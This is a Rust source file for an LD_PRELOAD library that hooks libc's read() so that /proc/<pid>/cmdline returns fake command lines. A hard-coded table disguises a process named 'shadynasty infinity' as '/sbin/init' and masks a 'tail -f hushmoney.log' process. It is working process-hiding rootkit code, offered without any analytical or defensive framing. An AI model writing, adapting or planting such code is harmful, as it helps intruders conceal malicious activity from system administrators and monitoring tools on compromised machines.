extern crate libc;
extern crate ctor;
extern crate lazy_static;

use libc::{c_int, c_void, ssize_t, c_char, open};
use std::ffi::{CStr, CString};
use std::os::unix::io::RawFd;
use std::fs::OpenOptions;
use std::io::Write;
use std::collections::HashMap;
use lazy_static::lazy_static;

lazy_static! {
    static ref PROCS_TO_REPLACE: HashMap<&'static str, &'static str> = {
        let mut m = HashMap::new();
        m.insert("shadynasty infinity", "/sbin/init");
        m.insert("/usr/bin/tail -f hushmoney.log", "nothing to see here");
        m
    };
}

static mut ORIGINAL_READ: Option<unsafe extern "C" fn(c_int, *mut c_void, usize) -> ssize_t> = None;
extern "C" {
    fn dlsym(handle: *mut c_void, symbol: *const c_char) -> *mut c_void;
    fn dlerror() -> *const c_char;
    fn readlink(path: *const c_char, buf: *mut c_char, bufsize: usize) -> ssize_t;
    fn close(fd: c_int) -> c_int;
}

#[ctor::ctor]
fn initialize() {
    unsafe {
        let symbol = CString::new("read").unwrap();
        let handle = libc::RTLD_NEXT as *mut c_void;
        let original = dlsym(handle, symbol.as_ptr());
        if original.is_null() {
            eprintln!(
                "Failed to load original read: {}",
                CStr::from_ptr(dlerror()).to_str().unwrap()
            );
            std::process::abort();
        }
        ORIGINAL_READ = Some(std::mem::transmute(original));
    }
}

fn get_path_from_fd(fd: RawFd) -> Option<String> {
    let path = format!("/proc/self/fd/{}", fd);
    let mut buf = vec![0 as c_char; 4096]; 
    let path_len = unsafe { readlink(CString::new(path).unwrap().as_ptr(), buf.as_mut_ptr(), buf.len()) };

    if path_len > 0 {
        let path_cstr = unsafe { CStr::from_ptr(buf.as_ptr()) };
        return path_cstr.to_str().ok().map(|s| s.to_string());
    }

    None
}

#[no_mangle]
pub extern "C" fn read(fd: c_int, buf: *mut c_void, count: usize) -> ssize_t {
    let original_read = unsafe { ORIGINAL_READ.unwrap() }; 

    let path_opt = get_path_from_fd(fd);
    if let None = path_opt {
        return unsafe { original_read(fd, buf, count) };
    }
    let path = path_opt.unwrap();

    if path.starts_with("/proc/") && path.ends_with("/cmdline") {

        // Open a new file descriptor for the same file
        let c_path = CString::new(path).unwrap();
        let dup_fd = unsafe { open(c_path.as_ptr(), libc::O_RDONLY) };
        if dup_fd == -1 {
            return -1; // If open failed, return an error
        }

        // Read the content of the cmdline file
        let mut cmdline_buf = vec![0 as u8; 4096];
        let cmdline_len = unsafe { original_read(dup_fd, cmdline_buf.as_mut_ptr() as *mut c_void, cmdline_buf.len()) };
        
        if cmdline_len < 1 {
            unsafe { return original_read(fd, buf, count); }
        }

        let cmdline_str = String::from_utf8_lossy(&cmdline_buf[..cmdline_len as usize])
            .replace('\0', " ")
            .trim()
            .to_string();

        for (key, &val) in PROCS_TO_REPLACE.iter() {
            if cmdline_str == *key {
                let fake_content = val.replace(' ', "\0");
                let fake_len = fake_content.len();

                let slice = unsafe { std::slice::from_raw_parts_mut(buf as *mut u8, count) };
                let to_copy = std::cmp::min(fake_len, count);
                slice[..to_copy].copy_from_slice(&fake_content.as_bytes()[..to_copy]);

                unsafe { close(dup_fd) };
                unsafe { close(fd) };
                return to_copy as ssize_t;
            }
        }

        unsafe { close(dup_fd) };      
    }

    // Call the original read function for other files
    unsafe { original_read(fd, buf, count) }
}
